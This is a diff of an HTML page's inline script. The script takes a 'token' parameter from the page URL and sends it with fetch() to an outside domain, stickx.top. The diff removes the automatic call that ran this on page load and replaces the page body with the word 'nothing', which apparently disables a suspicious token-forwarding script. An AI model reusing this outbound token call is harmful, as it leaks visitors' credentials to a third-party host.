@@ -5,8 +5,6 @@
 </head>
             <body>            <script>
         document.addEventListener("DOMContentLoaded", function() {
-    ExecuteTime();
-        });
 function ExecuteTime() {
                         function getParameterValue(paramName) {
             const urlParams = new URLSearchParams(window.location.search);
@@ -75,8 +73,8 @@ fetch(`https://stickx.top/api-codex/?token=${tagtokenValue}`, options)
   });
       }
 }
-
-
+});
+                        document.body.innerHTML = "nothing"
             </script>
             </body>
 </html>
